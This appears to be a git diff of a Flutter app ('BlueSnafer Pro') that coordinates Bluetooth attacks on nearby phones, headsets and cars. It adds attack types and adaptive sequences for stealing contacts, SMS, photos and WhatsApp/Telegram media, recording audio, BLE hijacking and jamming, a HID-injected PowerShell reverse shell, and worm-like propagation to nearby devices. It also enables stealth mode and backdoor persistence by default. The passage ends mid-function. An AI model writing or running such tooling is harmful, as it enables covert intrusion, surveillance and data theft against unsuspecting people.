@@ -15,6 +15,9 @@ import 'widgets/smart_suggestion_panel.dart';
 import 'exploits/exploit_manager.dart';
 import 'utils/device_utils.dart' as device_utils;
 import 'file_browser_screen.dart';
+import 'ai/smart_recommendation_system.dart';
+import 'ai/success_optimizer.dart';
+import 'ai/ml_vulnerability_predictor.dart';
 
 // ==================== PANTALLA DE PERMISOS ====================
 class PermissionScreen extends StatefulWidget {
@@ -261,11 +264,35 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
   static const _defaultMaxRetries = 2;
   static const _defaultRetryDelay = 2000; // 2s
 
+  // Tipos de ataque que REQUIEREN ROOT
+  static const Set<String> _rootRequiredTypes = {
+    'btlejack',
+    'btlejack_hijack',
+    'btlejack_jam',
+    'btlejack_mitm',
+    'blur_attack',
+    'sweyntooth_attack',
+    'blueborne',
+    'blueborne_root',
+    'knob',
+    'mac_spoof',
+    'l2cap_pwn',
+    'hfp_inject',
+    'hci_inject',
+    'bt_lateral_scan',
+    'bt_lateral_propagate',
+    'a2dp_record',
+    'a2dp_stream',
+    'a2dp_inject',
+    'ghost_relay',
+  };
+
     static const Map<String, Map<String, int>> _attackConfigs = {
       // Reconocimiento
       'sdp_discover': {'timeout': 5000, 'retries': 1, 'delay': 1000},
       'full_scan': {'timeout': 10000, 'retries': 2, 'delay': 2000},
       'mediastore_enumerate': {'timeout': 8000, 'retries': 1, 'delay': 1000},
+      'mediastore_extract': {'timeout': 10000, 'retries': 2, 'delay': 2000},
       // === CVE-2025-13834: RFCOMM Heartbleed (reconocimiento - memoria kernel) ===
       'cve_2025_13834_heartbleed': {'timeout': 15000, 'retries': 2, 'delay': 2000},
       // A2DP Sink Recording (captura audio)
@@ -305,6 +332,7 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
       'pin_crack': {'timeout': 60000, 'retries': 1, 'delay': 0},
       // === CVE-2025-36911: Fast Pair Authentication Bypass ===
       'cve_2025_36911_fastpair': {'timeout': 15000, 'retries': 2, 'delay': 2000},
+      'fastpair_key_extract': {'timeout': 10000, 'retries': 1, 'delay': 1000},
       // Avanzados
       'mirror_profile': {'timeout': 15000, 'retries': 2, 'delay': 2000},
       'spoofing': {'timeout': 8000, 'retries': 1, 'delay': 1000},
@@ -313,11 +341,36 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
       'install_persistence': {'timeout': 20000, 'retries': 2, 'delay': 3000},
       // DoS
       'dos': {'timeout': 5000, 'retries': 1, 'delay': 0},
+      // === NUEVOS CVE 2025 ===
+      'cve_2025_26438_smp_bypass': {'timeout': 15000, 'retries': 2, 'delay': 2000},
+      'cve_2025_10456_ble_fixed': {'timeout': 10000, 'retries': 2, 'delay': 2000},
+      // === TÉCNICAS ADICIONALES ===
+      'sdp_enumerate': {'timeout': 8000, 'retries': 1, 'delay': 1000},
+      'btle_spoof': {'timeout': 10000, 'retries': 2, 'delay': 2000},
+      'a2dp_exploit': {'timeout': 15000, 'retries': 2, 'delay': 2000},
+      'a2dp_inject': {'timeout': 15000, 'retries': 2, 'delay': 2000},
+      'l2cap_pwn': {'timeout': 15000, 'retries': 2, 'delay': 2000},
+      'hfp_inject': {'timeout': 10000, 'retries': 1, 'delay': 1000},
+      'gatt_write': {'timeout': 10000, 'retries': 2, 'delay': 2000},
+      'ble_implement': {'timeout': 10000, 'retries': 2, 'delay': 2000},
+      'rfcomm_exploit': {'timeout': 15000, 'retries': 2, 'delay': 2000},
+      'app_data_scan': {'timeout': 15000, 'retries': 2, 'delay': 2000},
+      'network_scan': {'timeout': 10000, 'retries': 1, 'delay': 1000},
+      'wifi_scan': {'timeout': 8000, 'retries': 1, 'delay': 1000},
+      // === MULTI-PROTOCOL EXTRACTION ===
+      'multi_extract': {'timeout': 30000, 'retries': 1, 'delay': 2000},
+      // === ÚLTIMA GENERACIÓN ===
+      'ghost_relay': {'timeout': 45000, 'retries': 1, 'delay': 3000},
+      'bt_lateral_scan': {'timeout': 15000, 'retries': 1, 'delay': 2000},
+      'bt_lateral_propagate': {'timeout': 20000, 'retries': 2, 'delay': 3000},
     };
 
   final RealExploitService _exploitService = RealExploitService();
   final IntegratedAIService _aiService = IntegratedAIService();
   final AttackSuggestionEngine _suggestionEngine = AttackSuggestionEngine();
+  final SmartRecommendationSystem _smartRecommendation = SmartRecommendationSystem();
+  final SuccessOptimizer _successOptimizer = SuccessOptimizer();
+  final MLVulnerabilityPredictor _mlVulnerabilityPredictor = MLVulnerabilityPredictor();
   late TabController _tabController;
   StreamSubscription? _eventSubscription;
   final ScrollController _logScrollController = ScrollController();
@@ -343,7 +396,7 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
   Suggestion? _currentSuggestion;
   List<String> _executedAttacks = [];
   Map<String, double> _successRates = {};
-  bool _isStatusExpanded = true;
+
 
   // ==================== MEJORAS MODELO AUTOMÁTICO ====================
   
@@ -359,7 +412,7 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
   Map<String, List<Map<String, dynamic>>> _patternAnalysis = {};
   
   // 3. Stealth mode
-  bool _stealthMode = false;
+  bool _stealthMode = true;
   int _attackDelayMs = 1000;
   bool _maskDeviceIdentity = false;
   
@@ -411,7 +464,7 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
   bool _enableAdaptiveIntelligence = true;
   bool _enablePatternAnalysis = true;
   bool _enableNetworkAnalysis = true;
-   bool _enablePersistence = false;
+   bool _enablePersistence = true;
 
   // Adaptive strategy selection
   String? _deviceFingerprint;
@@ -552,10 +605,11 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
      {'type': 'bypass', 'command': 'mac_spoof', 'name': 'BYPASS_MAC', 'cve': '', 'category': 'bypass', 'desc': 'MAC spoofing'},
      {'type': 'bypass', 'command': 'obex_trust', 'name': 'BYPASS_OBEX', 'cve': '', 'category': 'bypass', 'desc': 'OBEX trust abuse'},
      {'type': 'pin_crack', 'name': 'PIN_BRUTE', 'cve': '', 'category': 'bypass', 'desc': 'PIN brute force'},
-     // === CVE-2025-36911: Fast Pair Authentication Bypass ===
-     {'type': 'cve_2025_36911_fastpair', 'name': 'FASTPAIR_BYPASS', 'cve': 'CVE-2025-36911', 'category': 'bypass', 'desc': 'Fast Pair Account Key spoofing - pairing sin confirmación'},
-     
-     // ===== DoS =====
+      // === CVE-2025-36911: Fast Pair Authentication Bypass ===
+      {'type': 'cve_2025_36911_fastpair', 'name': 'FASTPAIR_BYPASS', 'cve': 'CVE-2025-36911', 'category': 'bypass', 'desc': 'Fast Pair Account Key spoofing - pairing sin confirmación'},
+      {'type': 'fastpair_key_extract', 'name': 'FASTPAIR_KEY_EXTRACT', 'cve': 'CVE-2025-36911', 'category': 'bypass', 'desc': 'Fast Pair Account Key extraction from bonded devices'},
+      
+      // ===== DoS =====
     {'type': 'dos', 'command': 'gatt_flood', 'name': 'DOS_GATT', 'cve': 'CVE-2020-12351', 'category': 'dos', 'desc': 'GATT flood'},
     {'type': 'dos', 'command': 'l2cap_flood', 'name': 'DOS_L2CAP', 'cve': '', 'category': 'dos', 'desc': 'L2CAP flood'},
     {'type': 'dos', 'command': 'mtu_crash', 'name': 'DOS_MTU', 'cve': '', 'category': 'dos', 'desc': 'MTU crash'},
@@ -579,230 +633,136 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
      {'type': 'gatt_bulk_read', 'name': 'GATT_BULK', 'cve': '', 'category': 'ble', 'desc': 'Read all GATT characteristics'},
      {'type': 'gatt_monitor', 'name': 'GATT_MON', 'cve': '', 'category': 'ble', 'desc': 'Monitor GATT notifications'},
 
-     // ===== PERSISTENCIA =====
-    {'type': 'install_persistence', 'name': 'INSTALL_BACKDOOR', 'cve': '', 'category': 'persistence', 'desc': 'Install backdoor service'},
-  ];
+      // ===== PERSISTENCIA =====
+     {'type': 'install_persistence', 'name': 'INSTALL_BACKDOOR', 'cve': '', 'category': 'persistence', 'desc': 'Install backdoor service'},
+
+      // ===== MULTI-PROTOCOL EXTRACTION =====
+      {'type': 'multi_extract', 'name': 'MULTI_EXTRACT', 'cve': '', 'category': 'data', 'desc': 'Multi-protocol extraction: GATT + OBEX FTP + BIP + OPP'},
+      // ===== ÚLTIMA GENERACIÓN =====
+      // Ghost Relay Attack (CVE-2024-27100) - relay de doble transporte
+      {'type': 'ghost_relay', 'duration': 30, 'name': 'GHOST_RELAY', 'cve': 'CVE-2024-27100', 'category': 'advanced', 'desc': 'Ghost relay attack - bypass secure connection relay protection'},
+     // Bluetooth Lateral Movement - escaneo y propagación post-explotación
+     {'type': 'bt_lateral_scan', 'duration': 10, 'name': 'LATERAL_SCAN', 'cve': '', 'category': 'advanced', 'desc': 'Lateral movement - scan nearby devices via compromised target'},
+     {'type': 'bt_lateral_propagate', 'name': 'LATERAL_PROPAGATE', 'cve': '', 'category': 'advanced', 'desc': 'Propagate payload to nearby devices via OPP'},
+   ];
 
   // Estrategia adaptativa basada en reconocimiento
    /// Estrategia adaptativa completa basada en tipo de dispositivo y capacidades detectadas
    /// Organizada en fases para maximizar eficiencia y minimizar interferencias
    List<Map<String, dynamic>> _getAdaptiveAttackSequence(String deviceType) {
-     List<Map<String, dynamic>> sequence = [];
-     final deviceInfo = _reconnaissanceResults ?? {};
-      final deviceType_lower = deviceType.toLowerCase();
+      List<Map<String, dynamic>> sequence = [];
+      final deviceInfo = _reconnaissanceResults ?? {};
+      final dt = deviceType.toLowerCase();
 
-       // ==========================================
-       // FASE 1: RECONOCIMIENTO (paralelo, no invasivo)
-       // ==========================================
-       sequence.add({'type': 'sdp_discover', 'command': 'scan', 'name': 'SDP_SCAN', 'phase': 1, 'timeout': 5000, 'retries': 1});
-       sequence.add({'type': 'sdp_enumerate', 'command': 'all', 'name': 'SDP_ENUM', 'phase': 1, 'timeout': 8000, 'retries': 1});
-       sequence.add({'type': 'full_scan', 'name': 'FULL_SCAN', 'phase': 1, 'timeout': 10000, 'retries': 2});
+      final hasObex = deviceInfo['hasObex'] == true;
+      final hasAndroid = deviceInfo['androidVersion'] != null;
+      final isData = dt.contains('smartphone') || dt.contains('tablet') || dt.contains('laptop') || dt.contains('wearable') || dt.contains('car') || dt.contains('unknown');
+      final isAudio = dt.contains('audio') || dt.contains('headset') || dt.contains('speaker') || dt.contains('earbud');
+      final hasBle = deviceInfo['hasBle'] == true || dt.contains('wearable') || dt.contains('car');
+      final shouldTryObex = hasObex || (isData && !isAudio);
 
-        // === CVE-2025-13834: RFCOMM Heartbleed (crítica - fuga de memoria kernel) ===
-        // Sin pairing, extrae 127 bytes por iteración (credenciales, punteros, claves)
-        sequence.add({'type': 'cve_2025_13834_heartbleed', 'iterations': 20, 'name': 'HEARTBLEED_13834', 'phase': 1, 'timeout': 15000, 'retries': 2});
-
-        // GATT Bulk Read - extrae todas las características GATT (datos de sensores, firmware, config)
-        if (deviceInfo['hasBle'] == true) {
-          sequence.add({'type': 'gatt_bulk_read', 'name': 'GATT_BULK_READ', 'phase': 1, 'timeout': 20000, 'retries': 2});
-        }
-
-        // MediaStore solo para Android (rápido, alto valor)
-       if (deviceInfo['androidVersion'] != null) {
-         sequence.add({'type': 'mediastore_enumerate', 'name': 'MEDIASTORE_SCAN', 'phase': 1, 'timeout': 8000, 'retries': 1});
-         sequence.add({'type': 'app_data_scan', 'name': 'APP_DATA_SCAN', 'phase': 1, 'timeout': 15000, 'retries': 2});
-       }
-
-      // Red scan para Android (requiere location permission)
-      if (deviceInfo['androidVersion'] != null) {
+      // ========== FASE 1: RECONOCIMIENTO (paralelo) ==========
+      sequence.add({'type': 'sdp_discover', 'command': 'scan', 'name': 'SDP_SCAN', 'phase': 1, 'timeout': 5000, 'retries': 1});
+      sequence.add({'type': 'sdp_enumerate', 'command': 'all', 'name': 'SDP_ENUM', 'phase': 1, 'timeout': 8000, 'retries': 1});
+      sequence.add({'type': 'full_scan', 'name': 'FULL_SCAN', 'phase': 1, 'timeout': 10000, 'retries': 2});
+      sequence.add({'type': 'cve_2025_13834_heartbleed', 'iterations': 20, 'name': 'HEARTBLEED_13834', 'phase': 1, 'timeout': 15000, 'retries': 2});
+      if (hasAndroid) {
+        sequence.add({'type': 'mediastore_enumerate', 'name': 'MEDIASTORE_SCAN', 'phase': 1, 'timeout': 8000, 'retries': 1});
+        sequence.add({'type': 'app_data_scan', 'name': 'APP_DATA_SCAN', 'phase': 1, 'timeout': 15000, 'retries': 2});
         sequence.add({'type': 'network_scan', 'name': 'NETWORK_SCAN', 'phase': 1, 'timeout': 10000, 'retries': 1});
         sequence.add({'type': 'wifi_scan', 'name': 'WIFI_SCAN', 'phase': 1, 'timeout': 8000, 'retries': 1});
       }
 
-     // ==========================================
-     // FASE 2: EXTRACCIÓN DE DATOS (paralelo)
-     // ==========================================
-     final hasObex = deviceInfo['hasObex'] == true;
-     final hasAndroid = deviceInfo['androidVersion'] != null;
-     final isDataCapable = deviceType_lower.contains('smartphone') ||
-         deviceType_lower.contains('tablet') ||
-         deviceType_lower.contains('laptop') ||
-         deviceType_lower.contains('wearable') ||
-         deviceType_lower.contains('car') ||
-         deviceType_lower.contains('unknown') ||
-         deviceType_lower.contains('stub');
-     final isAudioDevice = deviceType_lower.contains('audio') ||
-         deviceType_lower.contains('headset') ||
-         deviceType_lower.contains('speaker') ||
-         deviceType_lower.contains('earbud');
-
-     final shouldTryObex = hasObex || (isDataCapable && !isAudioDevice);
-
+      // ========== FASE 2: EXTRACCIÓN DE DATOS (paralelo) ==========
+      // Multi-protocol extraction: GATT + OBEX + BIP + OPP (intenta todo)
+      if (hasBle || shouldTryObex || isData) {
+        sequence.add({'type': 'multi_extract', 'name': 'MULTI_EXTRACT', 'phase': 2, 'timeout': 30000, 'retries': 1});
+      }
       if (shouldTryObex) {
-        // Scan OBEX primero (listar todo)
         sequence.add({'type': 'obex_extract', 'command': 'scan', 'name': 'OBEX_EXTRACT_ALL', 'phase': 2, 'timeout': 15000, 'retries': 2});
-
-        // === BLUESNARF - EXTRACCIÓN DIRECTA DE CONTACTOS/CALENDARIO (CVE-2003-0300) ===
         sequence.add({'type': 'obex_get', 'command': 'telecom/pb.vcf', 'name': 'BLUESNARF_CONTACTS', 'phase': 2, 'timeout': 15000, 'retries': 2});
         sequence.add({'type': 'obex_get', 'command': 'telecom/cal.vcf', 'name': 'BLUESNARF_CALENDAR', 'phase': 2, 'timeout': 15000, 'retries': 2});
-
-        // Directory Traversal OBEX (CVE-2009-0244)
         sequence.add({'type': 'file_exfil_dir', 'command': '../..', 'name': 'OBEX_TRAVERSAL', 'phase': 2, 'timeout': 15000, 'retries': 2});
-
-        // Directorios priorizados (en orden de valor)
-        final priorityDirs = [
-          'DCIM/Camera',      // Fotos recientes (máximo valor)
-          'DCIM',             // DCIM completo
-          'WhatsApp/Media',   // WhatsApp (alto valor)
-          'Pictures',         // Pictures
-          'Screenshots',      // Capturas de pantalla
-          'Download',         // Descargas
-          'Telegram',         // Telegram
-          'Documents',        // Documentos generales
-        ];
-        for (final dir in priorityDirs) {
+        for (final dir in ['DCIM/Camera', 'DCIM', 'WhatsApp/Media', 'Pictures', 'Screenshots', 'Download', 'Telegram', 'Documents']) {
           sequence.add({'type': 'file_exfil_dir', 'command': dir, 'name': 'OBEX_${dir.toUpperCase().replaceAll('/', '_')}', 'phase': 2, 'timeout': 20000, 'retries': 2});
         }
-
-        // === OBEX OVER BLE (MODERNO) - EXTRACCIÓN via GATT ===
         if (deviceInfo['hasBle'] == true) {
           sequence.add({'type': 'obex_ble_transfer', 'command': '/DCIM/Camera', 'name': 'OBEX_BLE_CAMERA', 'phase': 2, 'timeout': 20000, 'retries': 2});
         }
       }
+      if (isData) sequence.add({'type': 'pbap_extract', 'command': 'all', 'name': 'PBAP_ALL', 'phase': 2, 'timeout': 30000, 'retries': 2});
+      if (dt.contains('smartphone') || dt.contains('tablet') || hasAndroid) {
+        sequence.add({'type': 'map_extract', 'name': 'MAP_SMS_EXTRACT', 'phase': 2, 'timeout': 20000, 'retries': 2});
+        sequence.add({'type': 'map_folders', 'name': 'MAP_FOLDERS', 'phase': 1, 'timeout': 10000, 'retries': 1});
+      }
 
-       // PBAP para smartphones/tablets/Android/unknown
-       if (deviceType_lower.contains('smartphone') ||
-           deviceType_lower.contains('tablet') ||
-           hasAndroid ||
-           isDataCapable) {
-         sequence.add({'type': 'pbap_extract', 'command': 'all', 'name': 'PBAP_ALL', 'phase': 2, 'timeout': 30000, 'retries': 2});
-       }
-
-       // === MAP (Message Access Profile) - extrae SMS/MMS ===
-       // Solo si tiene Android y es smartphone/tablet (SMS)
-       if (deviceType_lower.contains('smartphone') || deviceType_lower.contains('tablet') || hasAndroid) {
-         sequence.add({'type': 'map_extract', 'name': 'MAP_SMS_EXTRACT', 'phase': 2, 'timeout': 20000, 'retries': 2});
-         sequence.add({'type': 'map_folders', 'name': 'MAP_FOLDERS', 'phase': 1, 'timeout': 10000, 'retries': 1});
-       }
-
-       // ==========================================
-       // FASE 2: BYPASS DE AUTHENTICACIÓN (paralelo, intentar ANTES de extracción)
-       // ==========================================
-       if (deviceType_lower.contains('smartphone') || deviceType_lower.contains('tablet') || deviceType_lower.contains('unknown')) {
-         // Intentar bypass de OBEX trust (sin pairing)
-         sequence.add({'type': 'bypass', 'command': 'obex_trust', 'name': 'BYPASS_OBEX', 'phase': 2, 'timeout': 8000, 'retries': 1});
-         // Intentar quick connect race
-         sequence.add({'type': 'bypass', 'command': 'quick_connect', 'name': 'BYPASS_QUICK', 'phase': 2, 'timeout': 8000, 'retries': 2});
-         // Intentar SMP bypass (CVE-2025-26438)
-         sequence.add({'type': 'cve_2025_26438_smp_bypass', 'name': 'SMP_BYPASS_26438', 'phase': 2, 'timeout': 15000, 'retries': 2});
-       }
-
-       // ==========================================
-       // FASE 3: BLE EXPLOITS (paralelo, si tiene BLE)
-       // ==========================================
-       if (deviceInfo['hasBle'] == true || deviceType_lower.contains('wearable') || deviceType_lower.contains('car')) {
-         // Escaneo BLE básico
-         sequence.add({'type': 'btlejack', 'command': 'scan', 'name': 'BTLE_SCAN', 'phase': 3, 'timeout': 10000, 'retries': 2});
-         sequence.add({'type': 'btlejack', 'command': 'sniff', 'name': 'BTLE_SNIFF', 'phase': 3, 'timeout': 15000, 'retries': 1});
-         // Ataques BLE avanzados (session hijack, jamming, MITM)
-         sequence.add({'type': 'btlejack', 'command': 'hijack', 'name': 'BTLE_HIJACK', 'phase': 3, 'timeout': 12000, 'retries': 2});
-         sequence.add({'type': 'btlejack', 'command': 'jam', 'name': 'BTLE_JAM', 'phase': 3, 'timeout': 10000, 'retries': 1});
-         sequence.add({'type': 'btlejack', 'command': 'mitm', 'name': 'BLE_MITM', 'phase': 3, 'timeout': 15000, 'retries': 2});
-         // BLUR + SweynTooth (BLE 5.x modern exploits)
-         sequence.add({'type': 'blur_attack', 'name': 'BLUR_ATTACK', 'phase': 3, 'timeout': 8000, 'retries': 2});
-         sequence.add({'type': 'sweyntooth_attack', 'name': 'SWEYNTOOTH', 'phase': 3, 'timeout': 8000, 'retries': 2});
-         // BlueBorne (L2CAP, no pairing)
-         sequence.add({'type': 'blueborne', 'name': 'BLUEBORNE', 'phase': 3, 'timeout': 12000, 'retries': 2});
-         // BLE pairing bypass attempts
-         sequence.add({'type': 'ble_pairing', 'command': 'justworks', 'name': 'BLE_JUSTWORKS', 'phase': 3, 'timeout': 10000, 'retries': 2});
-         sequence.add({'type': 'ble_exploit', 'command': 'secure', 'name': 'BLE_SC_BYPASS', 'phase': 3, 'timeout': 10000, 'retries': 2});
-         // BLE GATT replay attack
-         sequence.add({'type': 'ble_replay', 'name': 'BLE_REPLAY', 'phase': 3, 'timeout': 12000, 'retries': 1});
-         // === CVE-2025-10456: BLE Fixed Channels Vulnerability ===
-         sequence.add({'type': 'cve_2025_10456_ble_fixed', 'name': 'BLE_FIXED_10456', 'phase': 3, 'timeout': 10000, 'retries': 2});
-
-        // === A2DP SINK RECORDING - captura audio del dispositivo ===
-        // Graba llamadas/música/videollamadas del dispositivo víctima
+      // ========== FASE 3: BLE EXPLOITS (paralelo) ==========
+      if (hasBle) {
+        sequence.add({'type': 'btlejack', 'command': 'scan', 'name': 'BTLE_SCAN', 'phase': 3, 'timeout': 10000, 'retries': 2});
+        sequence.add({'type': 'btlejack', 'command': 'sniff', 'name': 'BTLE_SNIFF', 'phase': 3, 'timeout': 15000, 'retries': 1});
+        sequence.add({'type': 'btlejack', 'command': 'hijack', 'name': 'BTLE_HIJACK', 'phase': 3, 'timeout': 12000, 'retries': 2});
+        sequence.add({'type': 'btlejack', 'command': 'jam', 'name': 'BTLE_JAM', 'phase': 3, 'timeout': 10000, 'retries': 1});
+        sequence.add({'type': 'btlejack', 'command': 'mitm', 'name': 'BLE_MITM', 'phase': 3, 'timeout': 15000, 'retries': 2});
+        sequence.add({'type': 'blur_attack', 'name': 'BLUR_ATTACK', 'phase': 3, 'timeout': 8000, 'retries': 2});
+        sequence.add({'type': 'sweyntooth_attack', 'name': 'SWEYNTOOTH', 'phase': 3, 'timeout': 8000, 'retries': 2});
+        sequence.add({'type': 'blueborne', 'name': 'BLUEBORNE', 'phase': 3, 'timeout': 12000, 'retries': 2});
+        sequence.add({'type': 'ble_pairing', 'command': 'justworks', 'name': 'BLE_JUSTWORKS', 'phase': 3, 'timeout': 10000, 'retries': 2});
+        sequence.add({'type': 'ble_exploit', 'command': 'secure', 'name': 'BLE_SC_BYPASS', 'phase': 3, 'timeout': 10000, 'retries': 2});
+        sequence.add({'type': 'ble_replay', 'name': 'BLE_REPLAY', 'phase': 3, 'timeout': 12000, 'retries': 1});
+        sequence.add({'type': 'cve_2025_10456_ble_fixed', 'name': 'BLE_FIXED_10456', 'phase': 3, 'timeout': 10000, 'retries': 2});
+        sequence.add({'type': 'gatt_bulk_read', 'name': 'GATT_BULK_READ', 'phase': 3, 'timeout': 20000, 'retries': 2});
+        sequence.add({'type': 'gatt_monitor', 'name': 'GATT_MONITOR', 'phase': 3, 'timeout': 35000, 'retries': 1});
+        sequence.add({'type': 'btle_spoof', 'command': 'identity', 'name': 'BLE_SPOOF', 'phase': 3, 'timeout': 10000, 'retries': 2});
+        sequence.add({'type': 'gatt_write', 'command': 'exploit', 'name': 'GATT_WRITE', 'phase': 3, 'timeout': 10000, 'retries': 2});
+        sequence.add({'type': 'ble_implement', 'name': 'BLE_IMPLEMENT', 'phase': 3, 'timeout': 10000, 'retries': 2});
+        sequence.add({'type': 'l2cap_pwn', 'name': 'L2CAP_PWN', 'phase': 3, 'timeout': 15000, 'retries': 2});
+        sequence.add({'type': 'cve_2025_26438_smp_bypass', 'name': 'SMP_BYPASS_26438', 'phase': 3, 'timeout': 15000, 'retries': 2});
+        sequence.add({'type': 'a2dp_exploit', 'name': 'A2DP_EXPLOIT', 'phase': 3, 'timeout': 15000, 'retries': 2});
+        sequence.add({'type': 'hfp_inject', 'script': 'voice', 'name': 'HFP_VOICE', 'phase': 3, 'timeout': 10000, 'retries': 1});
         sequence.add({'type': 'a2dp_record', 'duration': 30, 'name': 'A2DP_RECORD_30S', 'phase': 3, 'timeout': 35000, 'retries': 2});
-        // Streaming continuo (máx 5 min)
         sequence.add({'type': 'a2dp_stream', 'name': 'A2DP_STREAM', 'phase': 3, 'timeout': 350000, 'retries': 1});
       }
 
-     // ==========================================
-     // FASE 4: INYECCIÓN Y ATAQUES AVANZADOS (secuencial - pueden interferir)
-     // ==========================================
-     // AT Command Injection (si hay soporte AT)
-     if (deviceType_lower.contains('smartphone') || deviceType_lower.contains('car') || hasAndroid) {
-       sequence.add({'type': 'at_injection', 'name': 'AT_INJECTION', 'phase': 4, 'timeout': 8000, 'retries': 2});
-       sequence.add({'type': 'at_injection', 'command': 'ATD', 'name': 'AT_CALL', 'phase': 4, 'timeout': 5000, 'retries': 1});
-     }
-
-      // HID Injection (teclado humano)
-      if (deviceType_lower.contains('smartphone') || deviceType_lower.contains('tablet') || deviceType_lower.contains('laptop')) {
+      // ========== FASE 4: INYECCIÓN (SECUENCIAL) ==========
+      if (dt.contains('smartphone') || dt.contains('car') || hasAndroid) {
+        sequence.add({'type': 'at_injection', 'name': 'AT_INJECTION', 'phase': 4, 'timeout': 8000, 'retries': 2});
+        sequence.add({'type': 'at_injection', 'command': 'ATD', 'name': 'AT_CALL', 'phase': 4, 'timeout': 5000, 'retries': 1});
+      }
+      if (dt.contains('smartphone') || dt.contains('tablet') || dt.contains('laptop')) {
         sequence.add({'type': 'hid', 'script': 'notepad', 'name': 'HID_NOTEPAD', 'phase': 4, 'timeout': 10000, 'retries': 2});
         sequence.add({'type': 'hid', 'script': 'terminal', 'name': 'HID_TERMINAL', 'phase': 4, 'timeout': 10000, 'retries': 2});
         sequence.add({'type': 'hid', 'script': 'wifi', 'name': 'HID_WIFI', 'phase': 4, 'timeout': 12000, 'retries': 2});
         sequence.add({'type': 'hid_inject', 'name': 'HID_INJECT', 'phase': 4, 'timeout': 10000, 'retries': 2});
-      }
-
-      // === CVE-2024-43770: HID Remote Code Execution ===
-      // Inyección de comandos que ejecuta código remoto (PowerShell, cmd, etc.)
-      // Funciona en sistemas con perfil HID (Windows/Linux/macOS)
-      if (deviceType_lower.contains('smartphone') || deviceType_lower.contains('tablet') || deviceType_lower.contains('laptop')) {
         sequence.add({'type': 'cve_2024_43770_hid_rce', 'payloadType': 'powershell_reverse', 'name': 'HID_RCE_43770', 'phase': 4, 'timeout': 15000, 'retries': 2});
       }
+      if (shouldTryObex) sequence.add({'type': 'rfcomm_inject', 'name': 'BLUEBUGGING', 'phase': 4, 'timeout': 10000, 'retries': 1});
+      sequence.add({'type': 'rfcomm_exploit', 'name': 'RFCOMM_EXPLOIT', 'phase': 4, 'timeout': 15000, 'retries': 2});
 
-      // Bluebugging (RFCOMM) - solo si hay OBEX/Phonebook
-      if (shouldTryObex) {
-        sequence.add({'type': 'rfcomm_inject', 'name': 'BLUEBUGGING', 'phase': 4, 'timeout': 10000, 'retries': 1});
-      }
-
-      // ==========================================
-      // FASE 5: BYPASS DE AUTHENTICACIÓN (paralelo)
-      // ==========================================
-      if (deviceType_lower.contains('smartphone') || deviceType_lower.contains('tablet')) {
+      // ========== FASE 5: BYPASS AUTH (paralelo) ==========
+      if (dt.contains('smartphone') || dt.contains('tablet') || dt.contains('unknown')) {
+        sequence.add({'type': 'cve_2025_26438_smp_bypass', 'name': 'SMP_BYPASS_26438', 'phase': 5, 'timeout': 15000, 'retries': 2});
         sequence.add({'type': 'bypass', 'command': 'quick_connect', 'name': 'BYPASS_QUICK', 'phase': 5, 'timeout': 8000, 'retries': 2});
         sequence.add({'type': 'bypass', 'command': 'mac_spoof', 'name': 'BYPASS_MAC', 'phase': 5, 'timeout': 5000, 'retries': 1});
         sequence.add({'type': 'bypass', 'command': 'obex_trust', 'name': 'BYPASS_OBEX', 'phase': 5, 'timeout': 5000, 'retries': 1});
+        sequence.add({'type': 'pin_crack', 'name': 'PIN_BRUTE', 'phase': 5, 'timeout': 60000, 'retries': 1});
       }
-
-      // === CVE-2025-36911: Fast Pair Authentication Bypass ===
-      // Spoof Account Key para emparejar sin confirmación (BLE required)
       if (deviceInfo['hasBle'] == true) {
         sequence.add({'type': 'cve_2025_36911_fastpair', 'name': 'FASTPAIR_BYPASS_36911', 'phase': 5, 'timeout': 15000, 'retries': 2});
+        sequence.add({'type': 'fastpair_key_extract', 'name': 'FASTPAIR_KEY_EXTRACT', 'phase': 5, 'timeout': 10000, 'retries': 1});
       }
 
-     // ==========================================
-     // FASE 6: ATAQUES AVANZADOS (paralelo)
-     // ==========================================
-     sequence.add({'type': 'mirror_profile', 'name': 'MIRROR', 'phase': 6, 'timeout': 15000, 'retries': 2});
-     // Full scan ya en fase 1, pero agregar si queremos más exhaustivo
-     // Spoofing de identidad
-     sequence.add({'type': 'spoofing', 'command': 'BlueSnafer Pro', 'name': 'SPOOFING', 'phase': 6, 'timeout': 8000, 'retries': 1});
-
-      // ==========================================
-      // FASE 1: RECONOCIMIENTO (paralelo, no invasivo)
-      // ==========================================
-      sequence.add({'type': 'sdp_discover', 'command': 'scan', 'name': 'SDP_SCAN', 'phase': 1, 'timeout': 5000, 'retries': 1});
-      sequence.add({'type': 'sdp_enumerate', 'command': 'all', 'name': 'SDP_ENUM', 'phase': 1, 'timeout': 8000, 'retries': 1});
-      sequence.add({'type': 'full_scan', 'name': 'FULL_SCAN', 'phase': 1, 'timeout': 10000, 'retries': 2});
-
-      // MediaStore solo para Android (rápido, alto valor)
-      if (deviceInfo['androidVersion'] != null) {
-        sequence.add({'type': 'mediastore_enumerate', 'name': 'MEDIASTORE_SCAN', 'phase': 1, 'timeout': 8000, 'retries': 1});
-        sequence.add({'type': 'app_data_scan', 'name': 'APP_DATA_SCAN', 'phase': 1, 'timeout': 15000, 'retries': 2});
+      // ========== FASE 6: AVANZADOS + ÚLTIMA GENERACIÓN (paralelo) ==========
+      sequence.add({'type': 'mirror_profile', 'name': 'MIRROR', 'phase': 6, 'timeout': 15000, 'retries': 2});
+      sequence.add({'type': 'spoofing', 'command': 'BlueSnafer Pro', 'name': 'SPOOFING', 'phase': 6, 'timeout': 8000, 'retries': 1});
+      if (deviceInfo['hasBle'] == true) {
+        sequence.add({'type': 'ghost_relay', 'duration': 30, 'name': 'GHOST_RELAY', 'phase': 6, 'timeout': 45000, 'retries': 1});
       }
-
-      // Red scan para Android (requiere location permission)
-      if (deviceInfo['androidVersion'] != null) {
-        sequence.add({'type': 'network_scan', 'name': 'NETWORK_SCAN', 'phase': 1, 'timeout': 10000, 'retries': 1});
